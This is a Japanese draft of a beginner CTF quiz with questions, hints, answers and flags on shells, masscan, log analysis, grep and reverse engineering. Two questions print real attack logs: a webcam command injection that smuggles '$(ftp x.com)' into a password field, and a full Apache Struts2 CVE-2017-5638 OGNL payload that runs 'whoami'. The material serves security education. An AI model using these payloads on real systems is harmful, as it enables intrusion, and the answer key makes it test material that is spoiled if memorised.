# HackerzLab博多 vol4

問題　プログラミング系もどうよ

人力では無理なことをいかにプログラムに落とすか
buffer overflow
base64 n重

grep で大量のファイルからファイル内検索 
逆コンパイル->難読化もありかと(or16進数表記)
プログラムの入力をプログラムへ expectを使う(http://baqamore.hatenablog.com/entry/2017/01/31/061423)
stringsコマンドから実行ファイルの文字列取得
中華カメラの脆弱性 https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html
画像のバイナリにFLAG


## 各レベルの問題数
* レベル1相当：3問
* レベル2相当：問
* レベル3相当：問
* レベル4相当：問
* レベル5相当：問

## 問題概要
* 問1(レベル1)：こんなツール① (ネットで調べる系問題)
* 問2(レベル1)：こんなツール②　(ネットで調べる系問題)
* 問3(レベル2)：攻撃logから見つける①
* 問4(レベル2)：攻撃logから見つける②
* 問5(レベル3)：FLAGを見つけ出せ①
* 問6(レベル3)：FLAGを見つけ出せ②
* 問7(レベル2)：ファイル解析してみよう①
* 問8(レベル3)ファイル解析してみよう②
* 問9(レベル4)：ファイル解析してみよう③
* 問10(レベル4)：ファイル解析してみよう④

-- 

# 問題1
この中で一番最初にできたシェルはどれでしょう
## 選択肢
1. csh
2. sh
3. fish 
4. zsh
## ヒント
1 調べてみましょう
2 一番新しいものはzshです
3 他のものも順番を調べてみましょう(これ以上のヒントはありません)
4 
5 
## 解答
2
## 解説
調べたらでて来ます

# 問題2
　/0アドレス空間をわずか6分でスキャンできると言われるツールはどれでしょう
## 選択肢
1 masscan
2 phpmyadmin
3 nmap
4 mysql
## ヒント
1 知らない単語を調べよう
2 ネットワークツールとして使うことができます
3 ZMAPというツールより高速だそうです
4 安易に使わないでください(これ以上のヒントはありません)
5

## 解答
1
## 解説
中身を学んでもらってnmapとの比較

# 問題3
こんなログがありました．これは何を攻撃するコードでしょう．(一部情報を伏せていますが必要ないので問題を解くのに影響はありません)
<CODE>
http://192.168.X.XXX/set_ftp.cgi?next_url=ftp.htm&loginuse=admin&loginpas=admin&svr=192.168.X.X&port=21&user=ftp&pwd=$(ftp x.com)ftp&dir=/&mode=PORT&upload_interval=0
http://192.168.X.XXX/ftptest.cgi?next_url=test_ftp.htm&loginuse=admin&loginpas=admin
</CODE>
## 選択肢
1 ドローン
2 IoT
3 中国製WEbカメラ 
4 phpが動くWebサーバ
## ヒント
1 ログを調べて見ましょう
2 これはWebサーバを攻撃するものではありませんね
3 ほかのものはどうでしょう(これ以上のヒントはありません)
 
## 解答
## 解説
https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html


# 問題4
こんなログがありました．これはどの脆弱性を狙った攻撃でしょう？
CVE-XXXX-XXXX (Xは数字)で答えてください
 

<CODE>
POST / HTTP/1.1
Connection: Keep-Alive
Content-Type: %{(#Normal='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
Accept: text/html, application/xhtml+xml, */*
Accept-Language: zh-CN
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
Content-Length: 178
Host: ***.***.***.***
 
c="123"
 
--447635f88b584ab6b8d9c17d04d79918
 
Content-Disposition: form-data; name="image1"
 
Content-Type: text/plain; charset=utf-8
 
x
--447635f88b584ab6b8d9c17d04d79918--
</CODE> 
## ヒント
1 攻撃コードで調べてみましょう
2 Apache Strutsの脆弱性ですね
3 どのCVEか調べてみてください(これ以上のヒントはありません)
4 
5 

## 解答
CVE-2017-5638
## 解説
http://www.morihi-soc.net/?p=654

# 問題5
大量のファイルのなかから見つけ出す (パスワードあり)
## ヒント
1 READMEを読んでください
2 ファイルの中から文字列を探すにはgrepを使いましょう 
3 grepでフォルダから探すときのオプションを調べてみましょう
4 すべてのフォルダを解凍しましょう
5 さっきと同じ方法で探してみてください
## 添付ファイル HLHQuiz1.zip
## 解答
Mercury
## 解説
3/22.txt
1にはパスワードがかかってないので grep -rn passwordでさがしてそのあとのこりから探してください

# 問題6
ファイルをダウンロードしてフラグを見つけてください
YOUR FLAG is HLH = {~~~~}
## ヒント
1 ファイルを解凍しよう
2 どれを解凍したらいいと思いますか？
3 https://github.com/nkchan/MyTools/blob/master/HackerzLab/Vol14_Q6.sh
4 スクリプトを使ってFLAGがあるフォルダを見つけましょう
5 あとはそのフォルダの中から探してください あと暗号化しているのでがんばってください

## 添付ファイル HLHQuiz2.zip
## 解答
Venus
## 解説
7/55.txt に答え
zip解凍後はtarがいっぱいあるのでどうにかして(俺のgitのスクリプト使うのがまあ早そう動かなかったらごめんなさい)

そのあとgrep -rn YOUR 7/ とかで調べればでてくる

# 問題7
次のファイルを解析してフラグを見つけてください．
YOUR FLAG is HLH = {***}
## ヒント
1 スクリプトの解析はどうしたらいいでしょうか
2 中を見てみましたか？
3 中見てのなにもわからないのでなにをしたらいいか考えよう
4 ファイルを実行してみよう
5 いつもの暗号です
## 添付ファイル HLHQuiz3.pl
## 解答
Earth
## 解説
perlラクダ

# 問題8
次のファイルを解析してフラグを見つけてください．
YOUR FLAG is HLH = {***}
## ヒント
1 実行してみたらどうなりますか？
2 逆コンパイルしてみましょう
3 javap を使ってみよう
4 オプション指定をして見よう（これ以上のヒントはありません）
5 
## 添付ファイル HLHQuiz4.class
## 解答 
Mars
## 解説
java 逆コンパイル
javap -c 


# 問題9
次のファイルを解析してフラグを見つけてください．
YOUR FLAG is HLH = {***}
## ヒント
1 ファイルを実行してみましょう
2 引数に数字を入れてみよう(当たったらラッキーくらいで)
3 1から256まで入れる方法を考えてみましょう
4 https://github.com/nkchan/MyTools/blob/master/HackerzLab/Vol14_Q9.sh
5 スクリプトを実行してみよう
## 添付ファイル HLHQuiz5.out
## 解答 
Jupiter
## 解説
c言語スクリプトで



# 問題10
次のファイルをダウンロードして，flagの値を求めてください
## ヒント
1 C言語でも字と数字を足したらどうなるでしょう
2 "A"+1 => Bになります
3 配列aはそれぞれの文字をずらす字数を表しています
4 for文を使って flag[i] = str1[i] + a[i]
5 書き換えたらファイルを実行しましょう
## 添付ファイル　HLHQuiz6.c
## 解答 
Saturn
## 解説
c言語文字足し

